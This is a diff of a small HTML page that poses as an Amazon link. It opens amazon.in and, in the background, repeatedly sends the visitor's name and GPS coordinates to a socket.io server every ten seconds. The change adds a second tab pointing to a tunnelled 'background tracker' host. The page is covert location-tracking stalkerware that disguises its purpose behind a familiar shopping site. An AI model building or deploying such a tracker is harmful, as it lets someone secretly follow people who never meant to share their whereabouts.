@@ -1,45 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon + Live Location</title>
+    <title>Amazon + Background Tracker</title>
 </head>
 <body>
-    <h2>Amazon opened & location sending in background...</h2>
+    <h2>Click below to open Amazon & background tracker</h2>
+    <button id="openBoth">Open Amazon + Start Tracker</button>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io(); // connect to server
-        const name = prompt("Enter your name"); // ya hardcode kar sakte ho
+        const socket = io();
+        const name = prompt("Enter your name");
 
-        // Function to send location
         function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const data = {
+                        socket.emit("location", {
                             name: name,
                             lat: position.coords.latitude,
                             lon: position.coords.longitude
-                        };
-                        socket.emit("location", data);
-                        console.log("Location sent:", data);
+                        });
+                        console.log("Location sent:", position.coords);
                     },
                     () => console.log("Location permission denied")
                 );
-            } else {
-                console.log("Geolocation not supported");
             }
         }
 
-        // Page load event
-        window.addEventListener("load", () => {
-            // Open Amazon in new tab
+        document.getElementById("openBoth").addEventListener("click", () => {
+            // 1️⃣ Amazon tab
             window.open("https://www.amazon.in", "_blank");
 
-            // Send location immediately
-            sendLocation();
+            // 2️⃣ Background location tab
+            window.open("https://myapp.serveousercontent.com", "_blank");
 
-            // Continue sending location every 10 seconds in background
+            // Start sending location in current tab (optional)
+            sendLocation();
             setInterval(sendLocation, 10000);
         });
     </script>
